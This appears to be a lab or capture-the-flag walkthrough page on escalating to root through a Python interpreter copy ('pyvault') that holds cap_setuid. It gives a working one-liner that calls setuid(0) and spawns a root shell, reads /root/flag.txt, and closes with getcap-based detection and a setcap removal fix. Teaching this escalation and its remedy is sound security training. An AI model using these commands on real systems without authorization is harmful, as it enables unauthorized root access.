# C05 · Station A — cap_setuid on python3 · ★★☆☆

> **Chapter:** [[Chapter-05-Overview]] · **Next:** [[C05-Station-B-cap_setuid-perl]]
> **Host:** `hollow-vault-01` (`target-caps`) · **Binary:** `/usr/local/bin/pyvault`
> **The bug:** a copy of the Python interpreter carries `cap_setuid=ep`.

---

## 1. Exploit — do this first

```bash
pyvault -c 'import os; os.setuid(0); os.system("/bin/bash")'
id            # uid=0(root)
cat /root/flag.txt
```

| Token | What it does |
|---|---|
| `cap_setuid` | lets the process call `setuid(0)` without being root |
| `os.setuid(0)` | becomes uid 0 (would be `EPERM` otherwise) |
| `os.system(...)` | spawns a root shell |

---

## 2. How you find it

```bash
getcap -r / 2>/dev/null | grep setuid
# /usr/local/bin/pyvault cap_setuid=ep
pyvault --version        # it's just python3
```
An interpreter with `cap_setuid` is game over — it runs any code you write.

## 3. Why it works

`cap_setuid+ep` puts `CAP_SETUID` in the effective set the moment `pyvault`
execs, so `os.setuid(0)` succeeds. `id` still shows `gid=1001` — the capability
changes the uid, not the gid, and a root uid is all you need.

## 4. Pitfalls

- **gid stays yours** — that's expected; uid 0 is enough to read the flag.
- Use the capped copy (`pyvault`), not the system `python3`, which has no cap.

## 5. Detect & fix

- **Detect:** `getcap -r / | grep -iE 'setuid|setgid'` — any runtime with it is critical.
- **Fix:** `setcap -r /usr/local/bin/pyvault`. Never put `cap_setuid` on an interpreter; give it to a tiny single-purpose helper instead. More in [[Blue-Team-Playbook]].

## 6. What you learned

- A capability makes a privileged syscall succeed without the SUID bit.
- GTFOBins "Capabilities" lists python/perl/ruby/node for exactly this.

> Next: [[C05-Station-B-cap_setuid-perl]] · Related: [[C01-Station-B-GTFOBins-python]]
